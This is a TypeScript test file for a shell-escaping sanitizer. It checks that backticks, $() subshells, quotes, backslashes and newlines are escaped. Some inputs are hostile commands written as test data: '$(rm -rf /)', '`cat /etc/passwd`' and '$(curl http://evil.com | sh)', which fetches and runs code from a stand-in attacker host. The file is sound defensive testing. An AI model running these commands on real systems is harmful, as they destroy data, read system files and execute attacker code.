/**
 * Tests for sanitizeForShell() security utility
 */

import { describe, it, expect } from 'bun:test';
import { sanitizeForShell } from './security.ts';

describe('sanitizeForShell', () => {
  describe('shell metacharacter escaping', () => {
    it('should escape backticks (command substitution)', () => {
      expect(sanitizeForShell('`whoami`')).toBe('\\`whoami\\`');
    });

    it('should escape $() subshell syntax', () => {
      expect(sanitizeForShell('$(rm -rf /)')).toBe('\\$(rm -rf /)');
    });

    it('should escape $ variable expansion', () => {
      expect(sanitizeForShell('$HOME')).toBe('\\$HOME');
      expect(sanitizeForShell('${PATH}')).toBe('\\${PATH}');
    });

    it('should escape double quotes', () => {
      expect(sanitizeForShell('say "hello"')).toBe('say \\"hello\\"');
    });

    it('should escape single quotes', () => {
      expect(sanitizeForShell("it's")).toBe("it\\'s");
    });

    it('should escape backslashes', () => {
      expect(sanitizeForShell('path\\to\\file')).toBe('path\\\\to\\\\file');
    });

    it('should escape newlines', () => {
      expect(sanitizeForShell('line1\nline2')).toBe('line1\\nline2');
    });

    it('should escape carriage returns', () => {
      expect(sanitizeForShell('line1\rline2')).toBe('line1\\rline2');
    });
  });

  describe('combined injection vectors', () => {
    it('should neutralize full command injection via backticks', () => {
      const malicious = '`cat /etc/passwd`';
      const result = sanitizeForShell(malicious);
      // Backticks should be escaped with backslash, preventing shell interpretation
      expect(result).toBe('\\`cat /etc/passwd\\`');
      expect(result.startsWith('\\`')).toBe(true);
    });

    it('should neutralize full command injection via $() subshell', () => {
      const malicious = '$(curl http://evil.com | sh)';
      const result = sanitizeForShell(malicious);
      expect(result).not.toMatch(/^\$\(/);
      expect(result).toBe('\\$(curl http://evil.com | sh)');
    });

    it('should handle multiple metacharacters in one string', () => {
      const malicious = '`$("hello' + "'" + 'world\\n")';
      const result = sanitizeForShell(malicious);
      const expected = '\\`\\$(\\"hello' + "\\'" + 'world\\\\n\\")';
      expect(result).toBe(expected);
    });
  });

  describe('edge cases', () => {
    it('should handle empty string', () => {
      expect(sanitizeForShell('')).toBe('');
    });

    it('should return safe strings unchanged', () => {
      expect(sanitizeForShell('hello world')).toBe('hello world');
      expect(sanitizeForShell('simple-value')).toBe('simple-value');
      expect(sanitizeForShell('12345')).toBe('12345');
    });

    it('should handle unicode characters (pass through)', () => {
      expect(sanitizeForShell('hello')).toBe('hello');
      expect(sanitizeForShell('cafe\u0301')).toBe('cafe\u0301');
    });

    it('should handle very long strings', () => {
      const long = 'a'.repeat(10000);
      expect(sanitizeForShell(long)).toBe(long);
    });

    it('should double-escape already-escaped content', () => {
      // Documenting that sanitizeForShell does NOT detect already-escaped content
      // If called on an already-escaped string, the backslashes get escaped again
      expect(sanitizeForShell('\\`')).toBe('\\\\\\`');
      expect(sanitizeForShell('\\$')).toBe('\\\\\\$');
    });

    it('should handle null bytes in string', () => {
      const withNull = 'before\x00after';
      const result = sanitizeForShell(withNull);
      // Null bytes pass through since they are not shell metacharacters
      expect(result).toBe('before\x00after');
    });

    it('should handle CRLF line endings', () => {
      expect(sanitizeForShell('line1\r\nline2')).toBe('line1\\r\\nline2');
    });
  });
});
